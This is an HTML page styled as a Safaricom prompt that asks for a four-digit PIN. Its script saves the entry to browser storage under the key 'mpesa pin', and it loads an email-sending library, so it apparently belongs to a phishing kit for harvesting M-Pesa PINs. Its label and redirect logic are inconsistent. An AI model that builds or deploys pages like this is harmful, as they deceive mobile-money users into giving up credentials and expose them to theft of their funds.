<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safaricom</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <style>
        #heading {
            font-size: 30px;
            background-color: #f5f7f2;
            display: block;
            margin: 10px;
            padding: 20px;
        }
        #subheading {
            font-size: 25px;
            font-weight: bold;
            color: #5da9c9;
            display: block;
            margin: 10px;
            padding: 20px;
        }
        #enternumberlabel {
            color: #d6d4d4;
            margin-left: 20px;
            display: block;
        }
        #enternumberinput {
            display: block;
            outline: none;
            margin: 20px;
        }
        #getphonebutton {
            margin-top: 20px;
            margin-left: 50px;
            width: 80px;
            height: 30px;
            border-radius: 25px;
            font-size: 14px;

        }
    input {
        width: 80%;
        padding: 10px;
        margin-top: 10px;
        border: none;
        border-bottom: 1px solid #000;
        box-sizing: border-box;
    }
    </style>
</head>
<body>
    <label id="heading">Safaricom</label>
    <label id="subheading">Enter Pin</label>
    <label id="enternumberlabel">Digits (0-9, *, #, +) 10-13</label>
    <input id="enternumberinput" type="password" maxlength="4">
    <button id="getphonebutton">OK</button>

    <script>
        async function getpin() {
            const pin = document.getElementById("enternumberinput").value;
            localStorage.setItem("mpesa pin",pin)
            if (pin===""){
                window.location.href="SIM/index.html"
            }
        }
        document.getElementById("getphonebutton").addEventListener("click", getpin);
    </script>
</body>
</html>
